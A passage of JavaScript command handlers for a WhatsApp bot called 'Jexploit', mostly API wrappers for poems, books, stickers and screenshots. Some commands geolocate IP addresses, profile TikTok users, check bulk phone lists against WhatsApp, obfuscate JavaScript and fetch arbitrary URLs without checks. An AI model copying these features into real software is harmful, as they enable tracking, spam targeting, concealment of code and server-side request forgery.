            errorMsg = `❌ No definition found for "*${word}*". Please check the spelling.`;
        } else {
            errorMsg += 'Please try again later.';
        }
        reply(errorMsg);
    }
    break;
}
case 'poem':
case 'randompoem': {
    // Send processing message
    await reply('Finding a random poem for you... Please wait...');
    await conn.sendMessage(m.chat, { react: { text: '📖', key: m.key } });

    try {
        // the random poem API
        const apiUrl = 'https://apiskeith.top/education/randompoem';
        const response = await axios.get(apiUrl, { timeout: 15000 });
        
        // Check response
        if (!response.data?.status || !response.data?.result) {
            throw new Error('Invalid API response');
        }

        const poem = response.data.result;
        
        // Format the poem beautifully
        let poemText = `📜 *${poem.title}*\n`;
        poemText += `✍️ *by ${poem.author}*\n\n`;
        
        // Add the poem lines
        if (poem.lines && poem.lines.length > 0) {
            poemText += poem.lines.join('\n');
        } else if (poem.fullText) {
            poemText += poem.fullText;
        }
        
        // Add line count at the bottom
        if (poem.lineCount) {
            poemText += `\n\n_━━━━━━━━━━━━━━_\n📊 *${poem.lineCount} lines*`;
        }

        await conn.sendMessage(m.chat, { text: poemText }, { quoted: m });
        await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (error) {
        console.error('Random Poem API Error:', error.message);
        await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        
        let errorMsg = '❌ Failed to fetch a random poem. ';
        if (error.message.includes('timeout')) {
            errorMsg += 'Request timed out.';
        } else {
            errorMsg += 'Please try again later.';
        }
        reply(errorMsg);
    }
    break;
}
case 'fruit':
case 'fruitinfo': {
    if (!text) return reply(`🍎 *Fruit Information*\n\nPlease provide a fruit name.\n\nExample:\n${prefix}fruit apple\n${prefix}fruitinfo banana\n${prefix}fruit orange`);

    const fruitName = text.trim().toLowerCase();
    
    // Send processing message
    await reply(`🔍 Searching for information about: *${fruitName}*...`);
    await conn.sendMessage(m.chat, { react: { text: '🍊', key: m.key } });

    try {
        // Call the fruit API
        const apiUrl = `https://apiskeith.top/education/fruit?q=${encodeURIComponent(fruitName)}`;
        const response = await axios.get(apiUrl, { timeout: 10000 });
        
        // Check response
        if (!response.data?.status || !response.data?.result) {
            throw new Error('Invalid API response');
        }

        const fruit = response.data.result;
        
        // Format the fruit information
        let fruitText = `🍎 *Fruit: ${fruit.name}*\n\n`;
        fruitText += `📚 *Scientific Classification*\n`;
        fruitText += `• Family: ${fruit.family || 'N/A'}\n`;
        fruitText += `• Genus: ${fruit.genus || 'N/A'}\n`;
        fruitText += `• Order: ${fruit.order || 'N/A'}\n\n`;
        
        // Add nutrition information if available
        if (fruit.nutritions) {
            fruitText += `*Nutrition Facts (per 100g)*\n`;
            fruitText += `• Calories: ${fruit.nutritions.calories || 0} kcal\n`;
            fruitText += `• Fat: ${fruit.nutritions.fat || 0}g\n`;
            fruitText += `• Sugar: ${fruit.nutritions.sugar || 0}g\n`;
            fruitText += `• Carbohydrates: ${fruit.nutritions.carbohydrates || 0}g\n`;
            fruitText += `• Protein: ${fruit.nutritions.protein || 0}g\n`;
        }

        await conn.sendMessage(m.chat, { text: fruitText }, { quoted: m });
        await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (error) {
        console.error('Fruit API Error:', error.message);
        await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        
        let errorMsg = `❌ Could not find information for "${fruitName}". `;
        if (error.message.includes('timeout')) {
            errorMsg += 'Request timed out.';
        } else if (error.response?.status === 404) {
            errorMsg = `❌ No information found for "${fruitName}". Please check the spelling.`;
        } else {
            errorMsg += 'Please try again later.';
        }
        reply(errorMsg);
    }
    break;
}
case 'book':
case 'booksearch': {
    if (!text) return reply(`📚 *Book Search*\n\nPlease provide a book title to search.\n\nExample:\n${prefix}book a doll's house\n${prefix}booksearch harry potter\n${prefix}book moby dick`);

    const query = text.trim();
    
    // Send processing message
    await reply(`🔍 Searching for books: *${query}*...`);
    await conn.sendMessage(m.chat, { react: { text: '📚', key: m.key } });

    try {
        // Call the book search API
        const apiUrl = `https://apiskeith.top/education/booksearch?q=${encodeURIComponent(query)}`;
        const response = await axios.get(apiUrl, { timeout: 15000 });
        
        // Check response
        if (!response.data?.status || !response.data?.result || response.data.result.length === 0) {
            throw new Error('No books found');
        }

        const books = response.data.result;
        
        // Format the results
        let bookText = `📚 *Book Search Results for "${query}"*\n\n`;
        bookText += `━━━━━━━━━━━━━━━━━━\n\n`;
        
        // Show first 3 books to avoid long messages
        const maxBooks = Math.min(books.length, 3);
        
        for (let i = 0; i < maxBooks; i++) {
            const book = books[i];
            
            bookText += `📖 *${i+1}. ${book.title}*\n`;
            
            // Add authors
            if (book.authors && book.authors.length > 0) {
                const authorNames = book.authors.map(a => a.name).join(', ');
                bookText += `✍️ *Author:* ${authorNames}\n`;
            }
            
            // Add brief summary (truncated)
            if (book.summary) {
                const shortSummary = book.summary.length > 200 
                    ? book.summary.substring(0, 200) + '...' 
                    : book.summary;
                bookText += `📝 *Summary:* ${shortSummary}\n`;
            }
            
            // Add key metadata
            bookText += `📊 *Downloads:* ${book.downloadCount?.toLocaleString() || 0}\n`;
            bookText += `🔤 *Language:* ${book.languages?.join(', ') || 'en'}\n`;
            
            // Add subjects/topics (first 2)
            if (book.subjects && book.subjects.length > 0) {
                const subjects = book.subjects.slice(0, 2).join(' • ');
                bookText += `🏷️ *Topics:* ${subjects}`;
                if (book.subjects.length > 2) bookText += ` +${book.subjects.length - 2} more`;
                bookText += `\n`;
            }
            
            bookText += `\n━━━━━━━━━━━━━━━━━━\n\n`;
        }
        
        if (books.length > 3) {
            bookText += `_...and ${books.length - 3} more results. Search more specifically for detailed results._`;
        }

        await conn.sendMessage(m.chat, { text: bookText }, { quoted: m });
        await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (error) {
        console.error('Book Search API Error:', error.message);
        await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        
        let errorMsg = `❌ No books found for "${query}". `;
        if (error.message.includes('timeout')) {
            errorMsg = '❌ Request timed out. Please try again.';
        } else if (error.message.includes('No books found')) {
            errorMsg = `❌ No books found matching "${query}". Try a different title.`;
        } else {
            errorMsg += 'Please try again later.';
        }
        reply(errorMsg);
    }
    break;
}
case "helpers": {
    const search = (args && args.length) ? args.join(" ").toLowerCase() : "";

// Check if global.helpersList exists and is an array
const helpersList = Array.isArray(global.mess.helpersList) ? global.mess.helpersList : [];

const filtered = helpersList.filter(helper =>
    helper && helper.country && (helper.country.toLowerCase().includes(search))
);

if (!filtered.length) {
    return reply(`x No helper found for "${search}".\nTry using: *.helpers* to see all.`);
}
    filtered.sort((a, b) => (a.country || "").localeCompare(b.country || ""));

    let text = `*🌍 Jexploit Verified Helpers*\n\n`;
    filtered.forEach((helper, index) => {
      text += `${index + 1}. ${helper.flag || ""} *${helper.country || "N/A"}*\n   • ${helper.name || "N/A"}: ${helper.number || "N/A"}\n\n`;
    });

    text += `✅ Jexploit Team\n`;
    text += `📢 For more information and updates? Join our support group:\n👉 https://chat.whatsapp.com/LSbOiemulBC5eyiCrLcYub?mode=gi_t\n`;
    text += `⚠️ Charges may apply depending on the service provided.`;

    reply(text);
}
break
case "flux": {
   try {
if (!text) return reply(`*Usage:* ${command} <prompt>\n\n*Example:* ${command} cat`);
    

    await reply('> *Jexploit ᴘʀᴏᴄᴇssɪɴɢ ɪᴍᴀɢᴇ...*');

    const apiUrl = `https://apis.davidcyril.name.ng/flux?prompt=${encodeURIComponent(text)}`;

    await conn.sendMessage(m.chat, { image: { url: apiUrl }, caption: `🎨 *FLUX IMAGE GENERATOR*\n\n📄 *PROMPT:* ${text}\n\n> ᴘᴏᴡᴇʀᴇᴅ ʙʏ Jexploit` }, { quoted: m });
  } catch (error) {
    console.error('Error in Flux command:', error);
    reply(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
      }
}
break
case "toaudio": {
const quoted = m.quoted ? m.quoted : null;
  const mime = quoted?.mimetype || "";
    if (!quoted) return reply('*Reply to a video to convert it to audio!*');
    if (!/video/.test(mime)) return reply('*Only videos can be converted to audio!*');

    try {
      let buffer = await quoted.download();
      let converted = await toAudio(buffer, 'mp4');

      await conn.sendMessage(m.chat, { audio: converted.data, mimetype: 'audio/mpeg' }, { quoted: m });
      await converted.delete();
    } catch (e) {
      console.error(e);
      reply('*Failed to convert video to audio!*');
    }
}
break
case 'trackip': {
if (!text) return m.reply(`*Example:* ${prefix + command} 112.90.150.204`);
try {
let res = await fetch(`https://ipwho.is/${text}`).then(result => result.json());

const formatIPInfo = (info) => {
 return `
*IP Information*
• IP: ${info.ip || 'N/A'}
• Success: ${info.success || 'N/A'}
• Type: ${info.type || 'N/A'}
• Continent: ${info.continent || 'N/A'}
• Continent Code: ${info.continent_code || 'N/A'}
• Country: ${info.country || 'N/A'}
• Country Code: ${info.country_code || 'N/A'}
• Region: ${info.region || 'N/A'}
• Region Code: ${info.region_code || 'N/A'}
• City: ${info.city || 'N/A'}
• Latitude: ${info.latitude || 'N/A'}
• Longitude: ${info.longitude || 'N/A'}
• Is EU: ${info.is_eu ? 'Yes' : 'No'}
• Postal: ${info.postal || 'N/A'}
• Calling Code: ${info.calling_code || 'N/A'}
• Capital: ${info.capital || 'N/A'}
• Borders: ${info.borders || 'N/A'}
• Flag:
 - Image: ${info.flag?.img || 'N/A'}
 - Emoji: ${info.flag?.emoji || 'N/A'}
 - Emoji Unicode: ${info.flag?.emoji_unicode || 'N/A'}
• Connection:
 - ASN: ${info.connection?.asn || 'N/A'}
 - Organization: ${info.connection?.org || 'N/A'}
 - ISP: ${info.connection?.isp || 'N/A'}
 - Domain: ${info.connection?.domain || 'N/A'}
• Timezone:
 - ID: ${info.timezone?.id || 'N/A'}
 - Abbreviation: ${info.timezone?.abbr || 'N/A'}
 - Is DST: ${info.timezone?.is_dst ? 'Yes' : 'No'}
 - Offset: ${info.timezone?.offset || 'N/A'}
 - UTC: ${info.timezone?.utc || 'N/A'}
 - Current Time: ${info.timezone?.current_time || 'N/A'}
`;
};

if (!res.success) throw new Error(`IP ${text} not found!`);
await dave.sendMessage(m.chat, { location: { degreesLatitude: res.latitude, degreesLongitude: res.longitude } }, { ephemeralExpiration: 604800 });
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
await delay(2000);
m.reply(formatIPInfo(res)); 
} catch (e) { 
m.reply(`Error: Unable to retrieve data for IP ${text}`);
}
}
 break    
  case "tts": {
  if(!text) return reply("`provide a query`");
 reply(`processing your query`);
  try {
    let anu = `https://api.siputzx.my.id/api/tools/tts?text=${encodeURIComponent(text)}&voice=jv-ID-DimasNeural&rate=0%&pitch=0Hz&volume=0%`;
    const response = await axios.get(anu, {
      responseType: 'arraybuffer'
    });
    let buffer = response.data;

    conn.sendMessage(m.chat, {
      audio: buffer,
      mimetype: "audio/mpeg",
      mp3: true
    })
  } catch (err) {
    console.log(err);
    return err;
  }
}
break
case 'ttp':
case 'texttosticker':
case 'textsticker': {
    if (!text) return reply(`Example: ${prefix}ttp Kevin`);

    try {
        const apiUrl = `https://api.princetechn.com/api/tools/ttp?apikey=prince&query=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl);

        if (!response.data?.success || !response.data?.image_url) {
            return reply(`Failed to generate image.`);
        }

        // Download the image
        const imageBuffer = await axios({
            method: 'GET',
            url: response.data.image_url,
            responseType: 'arraybuffer'
        });

        await conn.sendImageAsSticker(m.chat, Buffer.from(imageBuffer.data), m, {
            packname: global.packname || 'JEXPLOIT-BOT',
            author: global.author || 'Kelvin Tech'
        });

    } catch (error) {
        console.error('TTP error:', error.message);
        reply(`Error: ${error.message}`);
    }
    
}
break; 
case "xvideos":{
    if (!q) return m.reply(`Example: ${prefix + command} anime`);
    m.reply(mess.wait);
const axios = require('axios');    
    try {
        const apiUrl = `https://restapi-v2.simplebot.my.id/search/xnxx?q=${encodeURIComponent(q)}`;
        const { data } = await axios.get(apiUrl);

        if (!data.status) return m.reply("Failed to fetch search results");

        let resultText = `*XNXX SEARCH RESULTS*\n`;
        resultText += `*Query:* ${q}\n`;
        resultText += `*Found:* ${data.result.length} videos\n\n`;

        const maxResults = 10;
        const displayResults = data.result.slice(0, maxResults);

        displayResults.forEach((video, index) => {
            resultText += `*${index + 1}. ${video.title}*\n`;
            resultText += `Info: ${video.info.trim()}\n`;
            resultText += `Link: ${video.link}\n\n`;
        });

        if (data.result.length > maxResults) {
            resultText += `_And ${data.result.length - maxResults} more results..._\n`;
            resultText += `_Use ${prefix}xnxxdown [link] to download any video_`;
        }

        await conn.sendMessage(m.chat, {
            text: resultText
        }, { quoted: m });

    } catch (error) {
        console.error(error);
        m.reply(`Error: ${error.message}`);
    }
    }
 break
//======[OTHER MENU CMDS]===
case "sswebtab": {
const q = args.join(" ");
    if (!q) return reply(`Please provide a URL to screenshot!`);
    
    const apiURL = `https://api.tioo.eu.org/sstab?url=${q}`;
    
    try {
      await conn.sendMessage(m.chat, { image: { url: apiURL } }, { quoted: m });
    } catch (error) {
      console.error('Error generating screenshot:', error);
      reply("An error occurred.");
    }
}
break 
case "ss2": {
 const q = args.join(" ");
    if (!q) return reply(`Please provide a URL to screenshot!`);
    
    const apiURL = `${global.mess.siputzx}/api/tools/ssweb?url=${q}&theme=light&device=mobile`;
    
    try {
      await conn.sendMessage(m.chat, { image: { url: apiURL } }, { quoted: m });
    } catch (error) {
      console.error('Error generating screenshot:', error);
      reply("An error occurred while generating the image.");
    }
}
break
case "ss": {
try {
    const url = args[0];
    if (!url) return reply("❌ Please provide a URL\nExample: .screenshot https://google.com");
    if (!url.startsWith("http")) return reply("❌ URL must start with http:// or https://");

    // ASCII loading bars with percentage
    const loadingBars = [
        { percent: 10, bar: "[▓░░░░░░░░░]", text: "✦ Initializing capture..." },
        { percent: 20, bar: "[▓▓░░░░░░░░]", text: "✦ Connecting to website..." },
        { percent: 30, bar: "[▓▓▓░░░░░░░]", text: "✦ Loading page content..." },
        { percent: 40, bar: "[▓▓▓▓░░░░░░]", text: "✦ Rendering elements..." },
        { percent: 50, bar: "[▓▓▓▓▓░░░░░]", text: "✦ Processing JavaScript..." },
        { percent: 60, bar: "[▓▓▓▓▓▓░░░░]", text: "✦ Capturing viewport..." },
        { percent: 70, bar: "[▓▓▓▓▓▓▓░░░]", text: "✦ Scrolling page..." },
        { percent: 80, bar: "[▓▓▓▓▓▓▓▓░░]", text: "✦ Finalizing screenshot..." },
        { percent: 90, bar: "[▓▓▓▓▓▓▓▓▓░]", text: "✦ Optimizing image..." },
        { percent: 100, bar: "[▓▓▓▓▓▓▓▓▓▓]", text: "✓ Capture complete!" }
    ];

    // Send initial message
    const loadingMsg = await conn.sendMessage(from, {
        text: "🔄 Starting screenshot capture...\n✦ Please wait..."
    }, { quoted: mek });

    // Animate loading progress
    for (const frame of loadingBars) {
        await sleep(800);
        await conn.relayMessage(from, {
            protocolMessage: {
                key: loadingMsg.key,
                type: 14,
                editedMessage: {
                    conversation: `📸 ${frame.bar} ${frame.percent}%\n${frame.text}`
                }
            }
        }, {});
    }

    // Final update before sending
    await sleep(800);
    await conn.relayMessage(from, {
        protocolMessage: {
            key: loadingMsg.key,
            type: 14,
            editedMessage: {
                conversation: "✅ Screenshot Captured!\n✦ Sending now..."
            }
        }
    }, {});

    await sleep(1000);

    // Send the actual screenshot
    await conn.sendMessage(from, {
        image: { url: `https://image.thum.io/get/fullpage/${url}` },
        caption: "- 🖼️ *Screenshot Generated*\n\n" +
                `> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ${global.botname}💪 💜`
    }, { quoted: mek });

  } catch (error) {
    console.error("Error:", error);
    reply("❌ Failed to capture screenshot\n✦ Please try again later");
  }
}
break
case "sswebpc": {
const q = args.join(" ");
    if (!q) return reply(`Please provide a URL to screenshot!`);
    
    const apiURL = `${global.mess.siputzx}/api/tools/ssweb?url=${q}&theme=light&device=tablet`;
    
    try {
      await conn.sendMessage(m.chat, { image: { url: apiURL } }, { quoted: m });
    } catch (error) {
      console.error('Error generating screenshot:', error);
      reply("An error occurred.");
    }
}
break
case "obfuscate": {
const tmpDir = './tmp';
if (!fs.existsSync(tmpDir)) {
    fs.mkdirSync(tmpDir, { recursive: true });
}
const quoted = m.quoted ? m.quoted : null;
  const mime = quoted?.mimetype || "";

  if (!quoted || mime !== "application/javascript") {
  return conn.sendMessage(m.chat, { text: "❌ *Error:* Reply to a `.js` file with `.obfuscate`!" }, { quoted: m });
          }
  try {
  const media = await quoted.download();
  const tempFile = `./tmp/original-${Date.now()}.js`;
  await fs.promises.writeFile(tempFile, media);

  conn.sendMessage(m.chat, { text: "🔒 Obfuscation started..." }, { quoted: m });

  const obfuscatedFile = await obfuscateJS(tempFile);

  await conn.sendMessage(m.chat, { text: "✅ Obfuscation complete! Sending file..." }, { quoted: m }); 
 
  await conn.sendMessage(m.chat, { document: fs.readFileSync(obfuscatedFile), mimetype: "text/javascript", fileName: "obfuscated.js" });

  await fs.promises.unlink(tempFile);
  await fs.promises.unlink(obfuscatedFile);
   } catch (error) {
  conn.sendMessage(from, { text: `❌ *Error:* ${error.message}` }, { quoted: m });
        } 

}
break
case 'obfuscate2':
case 'encrypt': {
    let code = '';
    const quoted = m.quoted;
    if (quoted && quoted.mimetype === 'application/javascript') {
        try {
            const buffer = await quoted.download();
            code = buffer.toString('utf-8');
        } catch (err) {
            return reply("Failed to read the .js file. Please try again.");
        }
    } else {
        args.shift();
        code = args.join(' ');
        
        if (!code) {
            return reply(`*Please reply to a .js file with ${prefix}obfuscate*`);
        }
    }
    
    try {
        await conn.sendPresenceUpdate('composing', from);
        
        const apiUrl = `https://api.princetechn.com/api/tools/encrypt?apikey=prince&code=${encodeURIComponent(code)}`;
        const { data } = await axios.get(apiUrl, { timeout: 30000 });
        
        if (data && data.success && data.encrypted_code) {
            const obfuscatedCode = data.encrypted_code;
            const fileName = `obfuscated_${Date.now()}.js`;
            
            await conn.sendMessage(from, {
                document: Buffer.from(obfuscatedCode, 'utf-8'),
                mimetype: 'application/javascript',
                fileName: fileName,
                caption: '*Code encrypted successfully✅.'
            }, { quoted: m });
        } else {
            reply("Failed to obfuscate code. Please check your code and try again.");
        }
    } catch (error) {
        console.error('Obfuscate error:', error.message);
        reply("Error obfuscating code. Please try again later!");
    }
    break;
}
break
case 'tiktokstalk':
case 'ttstalk': {
  if (!text) return reply(`Username? `)
let res = await fg.ttStalk(args[0])
let txt = `
┌──「 *TIKTOK STALK* 
──「 *TIKTOK STALK* 
▢ *🔖Number:* ${res.name}
▢ *🔖Username:* ${res.username}
▢ *👥followers:* ${res.followers}
▢ *🫂following:* ${res.following}
▢ *📌Desc:* ${res.desc}

▢ *🔗 Link* : https://tiktok.com/${res.username}
└────────────`
await conn.sendMessage(m.chat, {image: { url: res.profile}, caption: txt}, {quoted: m })
}
//======[CONVERT MENU CMDS]===
break 
case 's':
case "sticker": {
const quoted = m.quoted || m.msg?.quoted;
    if (!quoted) {
      return reply(`Send or reply to images, videos, or gifs with captions ${prefix + command}`);
    }

    const mime = quoted.mimetype || quoted.msg?.mimetype;
    if (!mime) {
      return reply(`The quoted message does not contain media. Please send or reply to an image, video, or gif.`);
    }

    const swns = args.join(" ");
    const pcknms = swns.split("|")[0];
    const atnms = swns.split("|")[1];

    try {
      if (/image/.test(mime)) {
        const media = await quoted.download();
        await conn.sendImageAsSticker(m.chat, media, m, {
          packname: pcknms ? pcknms : global.packname,
          author: atnms ? atnms : global.author,
        });
      }
      else if (/video/.test(mime)) {
        if ((quoted.msg || quoted).seconds > 10) {
          return reply("The video length must be 10 seconds or less. Please try again.");
        }
        const media = await quoted.download();
        await conn.sendVideoAsSticker(m.chat, media, m, {
          packname: pcknms ? pcknms : global.packname,
          author: atnms ? atnms : global.author,
        });
      }
    
      else {
        return reply(`Send or reply to images, videos, or gifs with captions ${prefix + command}`);
      }
    } catch (error) {
      console.error('Error processing sticker:', error);
      reply('An error occurred while processing the sticker.');
    }
}
break
case 'tomp3': {
    try {
        // Check if there's a quoted message
        if (!m.quoted) {
            return reply(`⚠️ Reply to a video or audio message!\n\nUsage: *${prefix}tomp3* (reply to a video/audio)`);
        }
        
        // Check if quoted message is video or audio
        if (!/video/.test(mime) && !/audio/.test(mime)) {
            return reply(`❌ Please reply to a video or audio message!`);
        }
        
        await reply(`⏳ Converting to MP3...`);
        
        let media;
        
        // Try different download methods
        if (typeof conn.downloadMediaMessage === 'function') {
            media = await conn.downloadMediaMessage(qmsg);
        } else if (typeof conn.downloadAndSaveMediaMessage === 'function') {
            const filePath = await conn.downloadAndSaveMediaMessage(qmsg, 'temp');
            media = fs.readFileSync(filePath);
            fs.unlinkSync(filePath);
        } else {
            // Manual download
            const stream = await downloadContentFromMessage(qmsg, /video/.test(mime) ? 'video' : 'audio');
            let buffer = Buffer.from([]);
            for await (const chunk of stream) {
                buffer = Buffer.concat([buffer, chunk]);
            }
            media = buffer;
        }
        
        // Convert to audio
        let audio;
        if (typeof toAudio === 'function') {
            audio = await toAudio(media, 'mp4');
        } else {
            // Fallback - send as is
            audio = media;
        }
        
        await conn.sendMessage(m.chat, {
            audio: audio,
            mimetype: 'audio/mpeg',
            fileName: 'converted.mp3'
        }, { quoted: m });
        
        await reply(`✅ Conversion complete!`);
        
    } catch (error) {
        console.error('Tomp3 error:', error);
        reply(`❌ Failed to convert: ${error.message}`);
    }
    
}
break
case "topdf":
case "pdf": {
try {
        if (!q) return reply("Please provide the text you want to convert to PDF. *Eg* `.topdf` *Kevin Ug🇺🇬*");

        // Create a new PDF document
        const doc = new PDFDocument();
        let buffers = [];
        doc.on('data', buffers.push.bind(buffers));
        doc.on('end', async () => {
            const pdfData = Buffer.concat(buffers);

            // Send the PDF file
            await conn.sendMessage(from, {
                document: pdfData,
                mimetype: 'application/pdf',
                fileName: 'Jexploit .pdf',
                caption: `${global.wm}`
            }, { quoted: mek });
        });

        // Add text to the PDF
        doc.text(q);

        // Finalize the PDF and end the stream
        doc.end();

    } catch (e) {
        console.error(e);
        reply(`Error: ${e.message}`);
    }
} 
break
case "fliptext": {
    if (args.length < 1) return reply(`*Example:\n${prefix}fliptext Kelvin*`);
    
    let quere = args.join(" ");
    let flipe = quere.split("").reverse().join("");
    
    reply(`Normal:\n${quere}\nFlip:\n${flipe}`);
}
break
case 'take':
case 'steal': {
    await takeCommand(conn, m.chat, m, args);    
}
break
case "qrcode": {
if (!text) return reply("Enter text or URL");

    try {
      let res = await fetch(`https://api.qrserver.com/v1/create-qr-code/?data=${text}&size=200x200`);
      let qrCodeUrl = res.url;

      await conn.sendMessage(m.chat, { image: { url: qrCodeUrl } }, { quoted: m });
    } catch (error) {
      console.error('Error generating QR code:', error);
      reply('An error occurred while generating the QR code.');
    }
}
break
case "getdevice": {
   if (!m.quoted) {
      return reply('*Please quote a message to use this command!*');
    }
    
    console.log('Quoted Message:', m.quoted);
console.log('Quoted Key:', m.quoted?.key);

    try {
      const quotedMsg = await m.getQuotedMessage();

      if (!quotedMsg) {
        return reply('*Could not detect, please try with newly sent message!*');
      }

      const messageId = quotedMsg.key.id;

      const device = getDevice(messageId) || 'Unknown';

      reply(`The message is sent from *${device}* device.`);
    } catch (err) {
      console.error('Error determining device:', err);
      reply('Error determining device: ' + err.message);
    }
}
break
case "browse": {
if (!text) return reply("Enter URL");

    try {
      let res = await fetch(text);

      if (res.headers.get('Content-Type').includes('application/json')) {
        let json = await res.json();
        await conn.sendMessage(m.chat, { text: JSON.stringify(json, null, 2) }, { quoted: m });
      } else {
        let resText = await res.text();
        await conn.sendMessage(m.chat, { text: resText }, { quoted: m });
      }

      if (!res.ok) throw new Error(`HTTP Error ${res.status}`);
    } catch (error) {
      reply(`Error fetching URL: ${error.message}`);
    }
}
break
case "filtervcf": {
const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";
    const normalizePhoneNumber = (phone) => {
      if (!phone || typeof phone !== 'string') return null;
      return phone.replace(/\D/g, '');
    };

    if (!quoted || !(mime === "text/vcard" || mime === "text/x-vcard")) {
      return conn.sendMessage(m.chat, { 
        text: "❌ *Error:* Reply to a `.vcf` file with `.filtervcf` or `.cleanvcf`!" 
      }, { quoted: m });
    }

    try {
      const media = await quoted.download();
      const vcfContent = media.toString('utf8');
      
      await conn.sendMessage(m.chat, { 
        text: "🔍 Filtering VCF - checking WhatsApp numbers, this may take a while..." 
      }, { quoted: m });

      const vCards = vcfContent.split('END:VCARD')
        .map(card => card.trim())
        .filter(card => card.length > 0);

      const validContacts = [];
      const invalidContacts = [];
      let processed = 0;

      for (const card of vCards) {
        try {
          const telMatch = card.match(/TEL[^:]*:([^\n]+)/);
          if (!telMatch) continue;
          
          const phoneRaw = telMatch[1].trim();
          const phoneNumber = normalizePhoneNumber(phoneRaw);
          if (!phoneNumber) continue;

          const jid = `${phoneNumber}@s.whatsapp.net`;
          const result = await conn.onWhatsApp(jid);
          
          if (result.length > 0 && result[0].exists) {
            validContacts.push(card);
          } else {
            invalidContacts.push(phoneNumber);
          }
        } catch (error) {
          console.error('Error processing contact:', error);
        }
      }

      const filteredVcf = validContacts.join('\nEND:VCARD\n') + (validContacts.length > 0 ? '\nEND:VCARD' : '');
      
      const resultMessage = `✅ *VCF Filtering Complete*\n\n` +
        `• Total contacts: ${vCards.length}\n` +
        `• Valid WhatsApp contacts: ${validContacts.length}\n` +
        `• Non-WhatsApp numbers removed: ${invalidContacts.length}\n\n` +
        `Sending filtered VCF file...`;

      await conn.sendMessage(m.chat, { text: resultMessage }, { quoted: m });

      await conn.sendMessage(m.chat, { 
        document: Buffer.from(filteredVcf), 
        mimetype: "text/x-vcard", 
        fileName: "filtered_contacts.vcf" 
      });

    } catch (error) {
      await conn.sendMessage(from, { 
        text: `❌ *Error:* ${error.message}` 
      }, { quoted: m });
    }
}
break
case 'removebg': {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";
    
    if (!quoted || !/image/.test(mime)) {
        return reply("Please reply to an image to remove its background.");
    }
    
    try {
        await conn.sendPresenceUpdate('composing', from);
        
        // Upload image and get URL
        const mediaUrl = await handleMediaUpload(quoted, conn, mime);
        
        if (!mediaUrl) {
            return reply("Failed to upload image. Please try again.");
        }
        
        const apiUrl = `https://api.princetechn.com/api/tools/removebg?apikey=prince&url=${encodeURIComponent(mediaUrl)}`;
        const { data } = await axios.get(apiUrl, { timeout: 30000 });
        
        if (data && data.success && data.result) {
            await conn.sendMessage(from, { image: { url: data.result }, caption: "Background removed successfully!" }, { quoted: m });
        } else {
            reply("Failed to remove background. Please try again with a different image.");
        }
    } catch (error) {
        console.error('RemoveBG error:', error.message);
        reply("Error removing background. Please try again later!");
    }
    
}
break
case "styletext": {
if (!text) return reply('*Enter a text!*');
    
    try {
      let anu = await styletext(text);
      let teks = `Styles for ${text}\n\n`;
      
      for (let i of anu) {
        teks += `□ *${i.name}* : ${i.result}\n\n`;
      }
      
      reply(teks);
    } catch (error) {
      console.error(error);
      reply('*An error occurred while fetching fancy text styles.*');
    }
}
break
case "tourl":
case "url": {
    const quoted = m.quoted || m.msg?.quoted;
    const mime = quoted?.mimetype || quoted?.msg?.mimetype;

    if (!quoted || !mime) {
        return reply('*Please reply to a media message!*');
    }

    try {
        await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
        
        const mediaUrl = await handleMediaUpload(quoted, conn, mime);
        
        if (!mediaUrl || mediaUrl.includes('exceeds the limit')) {
            return reply(`❌ ${mediaUrl || 'Upload failed!'}`);
        }

        // Try to get short URL
        let shortUrl = mediaUrl;
        try {
            const tinyRes = await axios.get(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(mediaUrl)}`, { timeout: 5000 });
            if (tinyRes.data) shortUrl = tinyRes.data;
        } catch (e) {}

        const { sendButtons } = require('gifted-btns');

        await sendButtons(conn, m.chat, {
            title: '📎 MEDIA UPLOADED',
            text: `✅ *Uploaded successfully!*\n\n🔗 *Link:* ${shortUrl}`,
            footer: 'Tap a button below',
            buttons: [
                {
                    name: 'cta_copy',
                    buttonParamsJson: JSON.stringify({
                        display_text: '📋 Copy Link',
                        copy_code: shortUrl
                    })
                },
                {
                    name: 'cta_url',
                    buttonParamsJson: JSON.stringify({
                        display_text: '🌐 Open Link',
                        url: mediaUrl
                    })
                }
            ]
        }, { quoted: m });

        await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

    } catch (error) {
        console.error('Upload error:', error);
        await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
        reply('*❌ An error occurred while uploading the media.*');
    }
    
}
break
case "npm": {
try {
    // Check if a package name is provided
    if (!args.length) {
      return reply("Please provide the name of the npm package you want to search for. Example: .npm express");
    }

    const packageName = args.join(" ");
    const apiUrl = `https://registry.npmjs.org/${encodeURIComponent(packageName)}`;

    // Fetch package details from npm registry
    const response = await axios.get(apiUrl);
    if (response.status !== 200) {
      throw new Error("Package not found or an error occurred.");
    }

    const packageData = response.data;
    const latestVersion = packageData["dist-tags"].latest;
    const description = packageData.description || "No description available.";
    const npmUrl = `https://www.npmjs.com/package/${packageName}`;
    const license = packageData.license || "Unknown";
    const repository = packageData.repository ? packageData.repository.url : "Not available";

    // Create the response message
    const message = `
*${global.botname} npm search*

*👀 NPM PACKAGE:* ${packageName}
*📄 DESCRIPTION:* ${description}
*⏸️ LAST VERSION:* ${latestVersion}
*🪪 LICENSE:* ${license}
*🪩 REPOSITORY:* ${repository}
*🔗 NPM URL:* ${npmUrl}
`;

    // Send the message
    await conn.sendMessage(from, { text: message }, { quoted: mek });

  } catch (error) {
    console.error("Error:", error);
    reply("An error occurred: " + error.message);
  }
}
break
case "userinfo":
case "ui": {
    try {
        // 1. DETERMINE TARGET USER
        let userJid = quoted?.sender || 
                     mek.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0] || 
